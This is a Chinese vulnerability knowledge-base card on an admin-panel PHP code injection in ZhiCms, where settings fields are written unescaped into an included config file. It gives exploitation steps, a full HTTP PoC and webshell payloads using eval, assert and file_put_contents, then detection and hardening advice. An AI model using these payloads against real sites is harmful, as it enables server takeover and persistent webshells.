---
id: web-php-rce-zhicms-manage-set-siteconfig-write
title: ZhiCms 后台基础设置写入 siteconfig.php：POST 值直拼 PHP 数组，闭合引号注入 system()/eval 致 RCE
type: scenario
domain: web
path: web/php/rce
technique: zhicms-manage-set-siteconfig-php-code-injection
tags:
- php
- rce
- zhicms
- cms
- file-write
- config-injection
- webshell
- authenticated
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V539
  verified_at: '2026-11-11T18:58:04+08:00'
  notes: 已对照原文 content.md 与全部 10 张图逐项核对：setcontroller::index() POST 分支将 sitename/hosturl/logo 等 11 个字段直拼 PHP 数组并 fopen/fwrite 到 CONFIG_PATH.siteconfig.php、GET 分支 include 该文件，代码与原文一致；后台基础设置页 logo 填入 ');system('whoami');/*（图08）、页面顶部回显 administrator（图09）、data/config/siteconfig.php 写入结果（图10）均一致。触发条件（管理员会话、data/config 可写）与原文一致；affected_versions 按原文未标产品版本省略正确。dedup new，related 为安装向导/CmsEasy/Discuz/PHPYUN 等其他产品配置写入，非同一代码点；与同文章 SQLi 卡为前后步骤、不同 sink，已互链。未验证点：PoC 未复跑。
url: /docs/web/php/rce/web-php-rce-zhicms-manage-set-siteconfig-write/
draft: false
kb_aliases:
- ZhiCms 后台 getshell
- siteconfig.php 写入
- manage/set/index RCE
- ZhiCms 配置写入
- ZhiCms 一句话木马
---

## 一句话结论

ZhiCms 后台 `app/manage/controller/setcontroller.php#index()` 在处理 POST 时，把 `sitename/hosturl/logo/...` 等十余个字段原样嵌进 `$Siteinfo=array('logo'=>'{$logo}',...)` 形式的 PHP 源码并 `fopen/fwrite` 到 `data/config/siteconfig.php`；攻击者只要在任意字段填入 `');system('whoami');/*` 这类值，即可闭合单引号与数组、写入任意 PHP 代码，而该配置文件会被页面 `include`，访问即执行，形成后台配置写入 getshell（前置通常是通过前台 SQL 注入拿到管理员）。

## 原理

- **写入点**：`setcontroller::index()` 的 POST 分支从 `$_POST` 直接取 `sitename`、`hosturl`、`logo`、`ewm`、`pid`、`appkey`、`secretKey`、`apiurl`、`code`、`zhuan`、`download`，用字符串插值拼出：
  ```php
  $Siteinfo=array(
    'sitename'=>'{$sitename}',
    'hosturl'=>'{$hosturl}',
    'logo'=>'{$logo}',
    ...
  );
  ```
  随后 `fopen(CONFIG_PATH . 'siteconfig.php', 'w')`、`fwrite($of, $content)`、`fclose($of)`，没有任何转义或白名单。
- **为什么能执行代码**：生成的文件本身是合法 PHP（以 `<?php` 开头），保存路径 `data/config/siteconfig.php` 在应用内被 `include CONFIG_PATH . 'siteconfig.php'` 使用（后台设置页 GET 分支就 include 它，其他读取站点配置的页面也会加载）。攻击者值里的 `'` 提前闭合字符串，`);` 结束数组赋值，随后写入的 `system(...)`/`eval(...)` 成为顶层 PHP 语句；末尾 `/*` 注释掉原模板剩余部分，保证语法完整。
- **为什么是"配置写入"而不是任意文件写**：文件名与路径固定（`data/config/siteconfig.php`），攻击者控制的是文件内容；但因为它被 PHP 解析且被应用 include，等价于代码执行。
- **前置条件**：该后台接口要求管理员会话；原文的完整链是先用前台 `cheaps/index` 的 SQL 注入拖出管理员口令并登录后台，再打这里（见关联卡）。单独看，这是一个"后台配置项未转义导致 PHP 代码注入"的典型场景。

## 触发条件

- 目标为 ZhiCms（原文环境 PHP 7.1.9 + MySQL），后台 `index.php?r=manage/set/index` 可达。
- 攻击者拥有后台管理员会话（或能通过其他漏洞获得，如前台 SQL 注入取口令）。
- `data/config/` 目录对 Web 进程可写（默认安装即如此）；应用会 include `siteconfig.php`。
- 目标未对后台 POST 内容做 PHP 代码/引号类过滤（默认无）。

## 利用步骤

1. 登录 ZhiCms 后台，打开「系统管理 → 基础设置」（`/index.php?r=manage/set/index`）。
2. 在任意字段（原文用 `logo`）填入闭合 payload：`');system('whoami');/*`，其余字段随意，提交。
3. 服务端把 payload 写入 `data/config/siteconfig.php`；GET 该设置页时会 `include siteconfig.php`，页面执行 `system('whoami')`，原文截图中页面顶部回显 `administrator`。
4. 若需稳定 WebShell，可改为写入 `');@eval($_POST['x']);/*` 或 `');@assert($_POST['x']);/*`，之后向任意会 include 该配置的页面 POST `x=<代码>` 执行。
5. 也可结合 SQL 注入先取管理员（见关联卡），完成前台到 RCE 的完整链。

## PoC

```http
POST /index.php?r=manage/set/index HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: <管理员会话>

sitename=ZhiCms&hosturl=&logo=%27%29%3Bsystem%28%27whoami%27%29%3B%2F*&ewm=&pid=&appkey=&secretKey=&apiurl=&code=&zhuan=0&download=
```

（`logo` 解码后为 `');system('whoami');/*`）

写入后的 `data/config/siteconfig.php` 片段（原文截图）：

```php
<?php
$Siteinfo=array(
    'sitename'=>'ZhiCms[Next版]',
    'hosturl'=>'',
    'logo'=>' ');system('whoami');/*',
    ...
);
```

- 任意字段都可注入：`sitename`、`hosturl`、`ewm` 等同理。
- 若目标对 `system` 有禁用函数限制，可换 `eval`/`assert`/写文件等；也可直接注入 `');file_put_contents('shell.php','<?php ...');/*`。

## 变体与关联

- 变体：把 payload 换成写独立 WebShell 的语句（`file_put_contents`）可绕开 `siteconfig.php` 的 include 时机限制，在 Web 目录落地独立一句话。
- 关联：[[web-generic-sqli-zhicms-cheaps-key-urldecode-stacked]]（前台 SQL 注入获取管理员口令，是本卡的常见前置链）。
- 关联：[[web-php-deserialization-zhicms-cve-2024-0603-simple-html-dom-template-eval]]（同产品另一条反序列化 RCE）。
- 关联：[[web-php-rce-cmseasy-thirdparty-header-footer-write-php]]（同为 CMS 后台把用户输入写入被包含文件的 PHP 代码注入场景）。

## 检测与防御

- 检测：`data/config/siteconfig.php` 被改写（文件完整性监控/哈希基线），内容中出现 `system(`、`eval(`、`assert(`、`$_POST` 等非配置语法；后台 `manage/set/index` 的 POST 值含 `'`、`);`、`/*` 等闭合特征。
- 检测：Web 目录新增独立 PHP 文件；访问设置页时响应出现命令回显。
- 防御：配置生成改用 `var_export()`/`serialize()`/JSON 等安全序列化，禁止字符串插值写 PHP 源码；对每项做类型与字符白名单校验。
- 防御：配置文件放到 Web 根目录之外或禁止 Web 服务器解析 `data/` 目录；`data/config/siteconfig.php` 只读挂载；后台配置修改加二次确认与审计日志。
